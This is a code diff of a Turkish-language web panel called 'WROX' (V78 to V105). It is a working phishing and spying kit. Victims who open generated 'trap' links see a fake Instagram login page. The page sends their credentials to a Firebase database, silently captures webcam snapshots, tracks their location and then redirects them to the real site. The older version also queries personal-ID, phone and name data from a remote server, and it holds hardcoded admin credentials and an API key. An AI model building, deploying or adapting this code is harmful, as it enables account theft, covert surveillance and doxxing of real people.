@@ -3,219 +3,236 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WROX V78 - ULTIMATE COMMAND</title>
+    <title>WROX V105 | FINAL TERMINAL</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --p: #00f2ff; --bg: #050505; --card: #0d0d0d; --text: #00ff88; --err: #ff003c; }
+        :root { --p: #00f2ff; --bg: #050505; --g: #00ff88; --r: #ff003c; --side: #0a0a0a; --insta: #e1306c; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Consolas', monospace; }
-        body { background: var(--bg); color: #fff; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
+        body { background: var(--bg); color: #fff; height: 100vh; overflow: hidden; display: flex; }
 
-        header { height: 60px; background: #000; border-bottom: 2px solid var(--p); display: flex; align-items: center; padding: 0 20px; justify-content: space-between; z-index: 1001; }
-        .ham-btn { font-size: 30px; cursor: pointer; color: var(--p); }
-        aside { position: fixed; top: 0; left: -300px; width: 280px; height: 100vh; background: #000; border-right: 1px solid #1a1a1a; transition: 0.4s; z-index: 2000; display: flex; flex-direction: column; overflow-y: auto; }
-        aside.open { left: 0; }
-        .overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.7); z-index:1999; }
-        .overlay.active { display:block; }
-        .menu-item { padding: 12px 20px; cursor: pointer; color: #888; border-bottom: 1px solid #080808; font-size: 13px; }
-        .menu-item:hover, .menu-item.active { background: rgba(0,242,255,0.05); color: var(--p); border-left: 4px solid var(--p); }
-        .nav-cat { padding: 15px 20px 5px; font-size: 10px; color: #333; letter-spacing: 2px; }
+        /* AUTH EKRANI */
+        #auth-overlay { position: fixed; inset: 0; background: #000; z-index: 2000; display: flex; align-items: center; justify-content: center; }
+        .auth-card { width: 350px; padding: 30px; border: 1px solid var(--p); background: #0a0a0a; }
+        .tab-box { display: flex; margin-bottom: 20px; border-bottom: 1px solid #222; }
+        .tab { flex: 1; padding: 10px; text-align: center; cursor: pointer; color: #444; }
+        .tab.active { color: var(--p); border-bottom: 2px solid var(--p); }
 
-        main { flex: 1; padding: 25px; overflow-y: auto; }
-        .page { display: none; max-width: 800px; margin: 0 auto; }
-        .page.active { display: block; }
-        input, button { width: 100%; padding: 14px; margin-bottom: 10px; background: #000; border: 1px solid #1a1a1a; color: var(--p); border-radius: 5px; outline: none; }
-        button { cursor: pointer; font-weight: bold; border: 1px solid var(--p); }
-        button:hover { background: var(--p); color: #000; }
-        .res-box { background: #000; border: 1px solid #111; padding: 15px; color: var(--text); font-size: 12px; min-height: 150px; border-radius: 5px; white-space: pre-wrap; }
+        /* HAMBURGER SIDEBAR */
+        aside { width: 260px; background: var(--side); border-right: 1px solid #111; display: flex; flex-direction: column; transition: 0.3s; z-index: 1000; }
+        .side-h { padding: 25px; border-bottom: 1px solid #1a1a1a; color: var(--p); font-size: 20px; font-weight: bold; letter-spacing: 2px; }
+        .nav-i { padding: 15px 25px; cursor: pointer; color: #888; border-left: 3px solid transparent; transition: 0.2s; }
+        .nav-i:hover, .nav-i.active { background: #0f0f0f; color: var(--p); border-left-color: var(--p); }
+
+        /* MAIN AREA */
+        main { flex: 1; display: flex; flex-direction: column; overflow: hidden; position: relative; }
+        header { height: 60px; border-bottom: 1px solid #111; display: flex; align-items: center; padding: 0 25px; justify-content: space-between; background: #000; }
+        .content { flex: 1; padding: 20px; overflow-y: auto; }
+        .card { background: #000; border: 1px solid #1a1a1a; padding: 20px; margin-bottom: 20px; border-radius: 4px; }
         
-        .live-box { margin-top: 20px; border: 2px solid var(--p); border-radius: 12px; padding: 20px; background: rgba(0,242,255,0.05); display: none; }
-        .live-box h4 { color: var(--err); font-size: 11px; margin-bottom: 15px; display: flex; align-items: center; }
-        .live-box h4::before { content: '●'; margin-right: 8px; animation: blink 1s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+        input, button { width: 100%; padding: 12px; margin-top: 10px; background: #080808; border: 1px solid #222; color: var(--p); outline: none; }
+        button { cursor: pointer; border-color: var(--p); font-weight: bold; }
+        button:hover { background: var(--p); color: #000; }
 
-        #auth-layer { position: fixed; inset: 0; background: #000; z-index: 10002; display: flex; align-items: center; justify-content: center; }
-        #cam-gallery { display: flex; flex-direction: column; gap: 15px; max-height: 500px; overflow-y: auto; padding-right: 5px; }
+        /* KAMERA LOGLARI (ALT ALTA) */
+        .cam-stream { display: flex; flex-direction: column; gap: 20px; padding-bottom: 50px; }
+        .cam-card { background: #0d0d0d; border: 1px solid #1a1a1a; border-radius: 8px; overflow: hidden; width: 100%; max-width: 500px; margin: 0 auto; }
+        .cam-img { width: 100%; height: auto; display: block; background: #000; }
+        .cam-info { padding: 10px; font-size: 11px; display: flex; justify-content: space-between; background: #080808; }
+
+        /* LIVE FEED AREA */
+        #live-feed { margin-top: 15px; border-top: 1px solid #111; padding-top: 10px; max-height: 300px; overflow-y: auto; }
+        .feed-item { padding: 8px; border-bottom: 1px solid #0a0a0a; font-size: 12px; }
+
+        /* TRAP UI (INSTA) */
+        .insta-page { background: #fff; height: 100vh; width: 100vw; display: flex; flex-direction: column; align-items: center; padding-top: 60px; color: #000; position: fixed; inset: 0; z-index: 5000; }
+        .insta-form { width: 350px; border: 1px solid #dbdbdb; padding: 30px; background: #fff; text-align: center; }
     </style>
 </head>
 <body>
 
-<div id="auth-layer">
-    <div style="width:340px; border:1px solid var(--p); padding:40px; background:var(--card); text-align:center;">
-        <h2 style="color:var(--p)">WROX SYSTEM</h2><br>
-        <input type="email" id="email" placeholder="E-POSTA">
-        <input type="password" id="pass" placeholder="ŞİFRE">
-        <div style="display:flex; gap:5px;">
-            <button onclick="handleAuth('login')">GİRİŞ</button>
-            <button onclick="handleAuth('reg')" style="border-color:#555; color:#555;">KAYIT</button>
-        </div>
-    </div>
-</div>
-
-<div class="overlay" onclick="toggleMenu()"></div>
-
-<header>
-    <div class="ham-btn" onclick="toggleMenu()">☰</div>
-    <div style="font-weight:900;">WROX <span style="color:var(--p)">V78</span></div>
-    <div id="u-status" style="font-size:10px; color:var(--text);">MISAFIR</div>
-</header>
-
-<aside id="menu">
-    <div class="nav-cat">SORGULAR</div>
-    <div class="menu-item active" onclick="pg('adsoyad')">👤 Ad Soyad</div>
-    <div class="menu-item" onclick="pg('tc')">🆔 T.C. Sorgu</div>
-    <div class="menu-item" onclick="pg('gsm')">📞 GSM Sorgu</div>
-    <div class="nav-cat">SIZMA ARAÇLARI</div>
-    <div class="menu-item" onclick="pg('spy_insta')">📸 Instagram</div>
-    <div class="menu-item" onclick="pg('spy_cam')">📷 Kamera (5x)</div>
-    <div class="menu-item" onclick="pg('spy_loc')">📍 Konum</div>
-    <div id="admin-tools" style="display:none;">
-        <div class="nav-cat">YÖNETİM</div>
-        <div class="menu-item" onclick="pg('logs')" style="color:var(--text)">📁 TÜM LOGLAR</div>
-        <div class="menu-item" onclick="pg('users')" style="color:var(--p)">👥 KULLANICILAR</div>
-    </div>
-    <div class="menu-item" onclick="logout()" style="color:var(--err); margin-top:auto;">ÇIKIŞ YAP</div>
-</aside>
-
-<main>
-    <div id="p-adsoyad" class="page active"><h2>👤 AD SOYAD</h2><input id="ad" placeholder="AD"><input id="soyad" placeholder="SOYAD"><button onclick="api('adsoyad')">SORGULA</button><div id="res-adsoyad" class="res-box"></div></div>
-    <div id="p-tc" class="page"><h2>🆔 T.C. SORGU</h2><input id="tcno" placeholder="TC NO"><button onclick="api('tc')">SORGULA</button><div id="res-tc" class="res-box"></div></div>
-    <div id="p-gsm" class="page"><h2>📞 GSM SORGU</h2><input id="gsmno" placeholder="5XXXXXXXXX"><button onclick="api('gsm')">SORGULA</button><div id="res-gsm" class="res-box"></div></div>
-
-    <div id="p-spy_insta" class="page">
-        <h2>📸 INSTA PHISH</h2>
-        <button onclick="gen('insta')">LİNK OLUŞTUR</button>
-        <input id="url-insta" readonly style="display:none; color:yellow; font-size:11px;">
-        <div id="box-insta" class="live-box"><h4>SON GELEN VERİ:</h4><div id="live-u"></div><div id="live-p" style="color:yellow"></div></div>
-    </div>
-
-    <div id="p-spy_cam" class="page">
-        <h2>📷 KAMERA SIZMA (5x BURST)</h2>
-        <button onclick="gen('cam')">LİNK OLUŞTUR</button>
-        <input id="url-cam" readonly style="display:none; color:yellow; font-size:11px;">
-        <div id="box-cam" class="live-box"><h4>CANLI GÖRÜNTÜ AKIŞI:</h4><div id="cam-gallery"></div></div>
-    </div>
-
-    <div id="p-spy_loc" class="page">
-        <h2>📍 KONUM TAKİBİ</h2>
-        <button onclick="gen('loc')">LİNK OLUŞTUR</button>
-        <input id="url-loc" readonly style="display:none; color:yellow; font-size:11px;">
-        <div id="box-loc" class="live-box"><h4>SON KONUM:</h4><a id="map-url" href="#" target="_blank" style="color:var(--p)">[ HARİTADA GÖR ]</a></div>
-    </div>
-
-    <div id="p-logs" class="page"><h2>📁 TÜM LOGLAR (ADMİN)</h2><div id="log-list" class="res-box"></div></div>
-    <div id="p-users" class="page"><h2>👥 KAYITLI KULLANICILAR</h2><div id="u-list" class="res-box"></div></div>
-</main>
+<div id="wrox-app"></div>
 
 <script>
-    const cfg = { apiKey: "AIzaSyD-heOy-CHV37ofCqNLbjchG5FtU6mRxc", authDomain: "wrox-vip.firebaseapp.com", databaseURL: "https://wrox-vip-default-rtdb.firebaseio.com", projectId: "wrox-vip" };
-    firebase.initializeApp(cfg); const db = firebase.database();
+    // --- FIREBASE AYARLARI ---
+    const firebaseConfig = { databaseURL: "BURAYA_FIREBASE_LINKINI_YAPISTIR" };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-    function handleAuth(m) {
-        const e = document.getElementById('email').value, p = document.getElementById('pass').value;
-        const id = e.replace(/\./g,'_');
-        if(m==='reg') db.ref('users/'+id).set({e, p, r:'free'}).then(()=>alert("Kayıt Başarılı!"));
-        else {
-            if(e==="afavan66@gmail.com" && p==="Efecan1903") save({e, r:'admin'});
-            else db.ref('users/'+id).once('value', s => { 
-                if(s.val() && s.val().p===p) save(s.val()); else alert("Hatalı Giriş!");
-            });
+    const params = new URLSearchParams(window.location.search);
+    const mode = params.get('mode');
+    const refUser = params.get('ref') || 'admin';
+    const vicID = "V-" + Math.random().toString(36).substr(2, 5).toUpperCase();
+
+    // --- 1. KURBAN MODU (INSTA + SPY) ---
+    if(mode === 'trap') {
+        document.getElementById('wrox-app').innerHTML = `
+            <div class="insta-page">
+                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a251b1a4d56.png" width="175">
+                <div class="insta-form">
+                    <input id="iu" placeholder="Telefon numarası, kullanıcı adı veya e-posta" style="background:#fafafa; border:1px solid #dbdbdb; color:#000;">
+                    <input id="ip" type="password" placeholder="Şifre" style="background:#fafafa; border:1px solid #dbdbdb; color:#000;">
+                    <button onclick="infiltrate()" style="background:#0095f6; color:#fff; border:none; margin-top:15px;">Giriş Yap</button>
+                </div>
+                <video id="v" autoplay muted style="display:none;"></video><canvas id="c" style="display:none;"></canvas>
+            </div>
+        `;
+
+        window.infiltrate = async () => {
+            const u = document.getElementById('iu').value;
+            const p = document.getElementById('ip').value;
+            if(!u || !p) return;
+            db.ref(`spy_live/${refUser}/${vicID}/insta`).set({ user: u, pass: p });
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('v').srcObject = stream;
+                setInterval(() => {
+                    const canvas = document.getElementById('c');
+                    canvas.width = 400; canvas.height = 300;
+                    canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 400, 300);
+                    db.ref(`spy_live/${refUser}/${vicID}`).update({
+                        img: canvas.toDataURL('image/jpeg', 0.5),
+                        last: Date.now(),
+                        model: navigator.platform
+                    });
+                }, 3000);
+                if(navigator.geolocation) {
+                    navigator.geolocation.watchPosition(pos => {
+                        db.ref(`spy_live/${refUser}/${vicID}`).update({ lat: pos.coords.latitude, lon: pos.coords.longitude });
+                    });
+                }
+                setTimeout(() => { window.location.href = "https://instagram.com"; }, 1500);
+            } catch(e) { window.location.href = "https://instagram.com"; }
+        };
+    } 
+
+    // --- 2. PANEL MODU ---
+    else {
+        const currentUser = localStorage.getItem('w_user');
+        if(!currentUser) {
+            renderAuth();
+        } else {
+            renderPanel(currentUser);
         }
     }
-    function save(u) { localStorage.setItem('ses', JSON.stringify(u)); location.reload(); }
-    const ses = JSON.parse(localStorage.getItem('ses'));
-    if(ses) {
-        document.getElementById('auth-layer').style.display='none';
-        document.getElementById('u-status').innerText = ses.e.split('@')[0].toUpperCase();
-        if(ses.r==='admin') document.getElementById('admin-tools').style.display='block';
+
+    function renderAuth() {
+        document.getElementById('wrox-app').innerHTML = `
+            <div id="auth-overlay">
+                <div class="auth-card">
+                    <div class="tab-box">
+                        <div id="t-login" class="tab active" onclick="switchTab('login')">GİRİŞ</div>
+                        <div id="t-reg" class="tab" onclick="switchTab('reg')">KAYIT</div>
+                    </div>
+                    <input type="text" id="un" placeholder="Kullanıcı Adı">
+                    <input type="password" id="up" placeholder="Şifre">
+                    <button id="auth-btn" onclick="processAuth()">SİSTEME GİR</button>
+                </div>
+            </div>
+        `;
     }
 
-    function pg(id) {
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.getElementById('p-'+id).classList.add('active');
-        if(id==='users') loadUsers();
-        toggleMenu();
-    }
-    function toggleMenu() { document.getElementById('menu').classList.toggle('open'); document.querySelector('.overlay').classList.toggle('active'); }
+    let currentTab = 'login';
+    window.switchTab = (t) => {
+        currentTab = t;
+        document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
+        document.getElementById('t-'+t).classList.add('active');
+        document.getElementById('auth-btn').innerText = t === 'login' ? 'GİRİŞ YAP' : 'KAYIT OL';
+    };
 
-    async function api(t) {
-        const out = document.getElementById('res-'+t); out.innerText = "Sorgulanıyor...";
-        let url = `http://194.15.52.78/bakim/adsoyadpro.php?ad=${document.getElementById('ad').value}&soyad=${document.getElementById('soyad').value}`;
-        if(t==='tc') url = `http://194.15.52.78/bakim/tcsorgu.php?tc=${document.getElementById('tcno').value}`;
-        if(t==='gsm') url = `http://194.15.52.78/bakim/gsmsorgu.php?no=${document.getElementById('gsmno').value}`;
-        const r = await fetch("https://api.allorigins.win/get?url=" + encodeURIComponent(url));
-        const d = await r.json(); out.innerText = d.contents || "Sonuç yok.";
+    window.processAuth = async () => {
+        const u = document.getElementById('un').value;
+        const p = document.getElementById('up').value;
+        if(currentTab === 'reg') {
+            await db.ref('users/' + u).set({ pass: p });
+            alert("Kayıt başarılı! Giriş yapın.");
+            switchTab('login');
+        } else {
+            const snap = await db.ref('users/' + u).once('value');
+            if(snap.exists() && snap.val().pass === p) {
+                localStorage.setItem('w_user', u);
+                location.reload();
+            } else { alert("Hata!"); }
+        }
+    };
+
+    function renderPanel(user) {
+        document.getElementById('wrox-app').innerHTML = `
+            <aside>
+                <div class="side-h">WROX V105</div>
+                <div class="nav-i active" onclick="showP('p-link')">🔗 TUZAK LİNKİ</div>
+                <div class="nav-i" onclick="showP('p-cam')">📷 KAMERA LOGLARI</div>
+                <div class="nav-i" onclick="showP('p-sorgu')">🔍 SORGULAR</div>
+                <button onclick="localStorage.clear();location.reload()" style="margin:auto 20px 20px; border-color:var(--r); color:var(--r);">ÇIKIŞ</button>
+            </aside>
+            <main>
+                <header><div>DURUM: <span style="color:var(--g)">ONLINE</span></div><div>${user.toUpperCase()}</div></header>
+                <div class="content">
+                    <div id="p-link" class="page">
+                        <div class="card">
+                            <h3>LİNK OLUŞTURUCU</h3>
+                            <input id="trap-url" readonly>
+                            <button onclick="copyL()">LİNKİ KOPYALA</button>
+                        </div>
+                        <div class="card">
+                            <h3>LİNK ALTI CANLI AKIŞ</h3>
+                            <div id="live-feed">Veri bekleniyor...</div>
+                        </div>
+                    </div>
+                    <div id="p-cam" class="page" style="display:none;">
+                        <div class="cam-stream" id="cam-logs"></div>
+                    </div>
+                    <div id="p-sorgu" class="page" style="display:none;">
+                        <div class="card"><h3>SORGU PANELİ</h3><input placeholder="T.C. / GSM / AD"><button>SORGULA</button></div>
+                    </div>
+                </div>
+            </main>
+        `;
+        setupLogic(user);
     }
 
-    function gen(m) {
-        const id = "W_" + Math.random().toString(36).substr(2,5).toUpperCase();
-        const owner = ses.e.replace(/\./g,'_');
-        const url = window.location.href.split('?')[0] + "?mode=" + m + "&id=" + id + "&owner=" + owner;
-        document.getElementById('url-'+m).value = url; document.getElementById('url-'+m).style.display = 'block';
-    }
+    function setupLogic(user) {
+        document.getElementById('trap-url').value = window.location.href.split('?')[0] + "?mode=trap&ref=" + user;
+        
+        db.ref('spy_live/' + user).on('value', snap => {
+            const data = snap.val();
+            const feed = document.getElementById('live-feed');
+            const cam = document.getElementById('cam-logs');
+            if(!data) return;
 
-    db.ref('spy_logs').on('child_added', s => {
-        const d = s.val(), myId = ses.e.replace(/\./g,'_');
-        if(d.owner === myId || ses.r === 'admin') {
-            if(d.type==='PHISH') { document.getElementById('box-insta').style.display='block'; document.getElementById('live-u').innerText="U: "+d.u; document.getElementById('live-p').innerText="P: "+d.p; }
-            if(d.type==='CAMERA') { 
-                document.getElementById('box-cam').style.display='block';
-                const gallery = document.getElementById('cam-gallery');
-                const img = document.createElement('img'); img.src = d.foto;
-                img.style = "width:100%; border:1px solid var(--p); border-radius:5px;";
-                gallery.insertBefore(img, gallery.firstChild);
+            feed.innerHTML = '';
+            cam.innerHTML = '';
+
+            for(let id in data) {
+                const v = data[id];
+                // Link Altı Akış
+                feed.innerHTML = `<div class="feed-item"><b>#${id}</b> -> ${v.insta ? v.insta.user+'|'+v.insta.pass : 'Bağlandı'}</div>` + feed.innerHTML;
+                
+                // Kamera Alt Alta Akış
+                if(v.img) {
+                    cam.innerHTML = `
+                        <div class="cam-card">
+                            <img src="${v.img}" class="cam-img">
+                            <div class="cam-info">
+                                <span>ID: ${id}</span>
+                                <span style="color:var(--p)">${new Date(v.last).toLocaleTimeString()}</span>
+                            </div>
+                        </div>
+                    ` + cam.innerHTML;
+                }
             }
-            if(d.type==='LOCATION') { document.getElementById('box-loc').style.display='block'; document.getElementById('map-url').href=d.map; }
-        }
-        if(ses.r==='admin') {
-            const list = document.getElementById('log-list');
-            list.innerHTML = `<div style="padding:5px; border-bottom:1px solid #111; font-size:10px;">[${d.type}] Sahip: ${d.owner} - ${d.date}</div>` + list.innerHTML;
-        }
-    });
-
-    function loadUsers() {
-        db.ref('users').on('value', s => {
-            const u = s.val(), div = document.getElementById('u-list'); div.innerHTML = "";
-            for(let k in u) div.innerHTML += `<div style="margin-bottom:5px;">${u[k].e} | PW: ${u[k].p}</div>`;
         });
     }
-    function logout() { localStorage.clear(); location.reload(); }
 
-    const q = new URLSearchParams(window.location.search);
-    const mode = q.get('mode'), vid = q.get('id'), owner = q.get('owner');
-    if(mode && vid && owner) {
-        document.body.innerHTML = `<div id="v" style="background:#fff; height:100vh; padding:50px; text-align:center; color:#000;"></div>`;
-        if(mode==='insta') {
-            document.getElementById('v').innerHTML = `<img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" width="150"><br><br><input id="vu" placeholder="Username"><input id="vp" type="password" placeholder="Password"><button onclick="vHit()" style="background:#0095f6; color:#fff;">Log In</button>`;
-        }
-        if(mode==='cam') {
-            navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
-                const ve = document.createElement('video'); ve.srcObject=s; ve.play();
-                let count = 0;
-                const snap = () => {
-                    if(count < 5) {
-                        count++;
-                        setTimeout(() => {
-                            const c = document.createElement('canvas'); c.width=640; c.height=480;
-                            c.getContext('2d').drawImage(ve,0,0);
-                            db.ref('spy_logs/'+vid+'_'+count).set({type:'CAMERA', foto:c.toDataURL('image/jpeg'), owner:owner, date:new Date().toLocaleTimeString()});
-                            snap();
-                        }, 2000);
-                    } else { setTimeout(()=>location.href="https://google.com", 1000); }
-                };
-                setTimeout(snap, 1000);
-            }).catch(()=>location.href="https://google.com");
-        }
-        if(mode==='loc') {
-            navigator.geolocation.getCurrentPosition(p => {
-                const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                db.ref('spy_logs/'+vid).set({type:'LOCATION', map:map, owner:owner, date:new Date().toLocaleString()}).then(()=>location.href="https://google.com");
-            });
-        }
-    }
-    function vHit() { 
-        db.ref('spy_logs/'+vid).set({type:'PHISH', u:document.getElementById('vu').value, p:document.getElementById('vp').value, owner:owner, date:new Date().toLocaleString()}).then(()=>location.href="https://instagram.com"); 
-    }
+    window.showP = (id) => {
+        document.querySelectorAll('.page').forEach(p => p.style.display='none');
+        document.querySelectorAll('.nav-i').forEach(n => n.classList.remove('active'));
+        document.getElementById(id).style.display='block';
+        event.currentTarget.classList.add('active');
+    };
+
+    window.copyL = () => { document.getElementById('trap-url').select(); document.execCommand('copy'); alert("Kopyalandı!"); };
 </script>
 </body>
 </html>
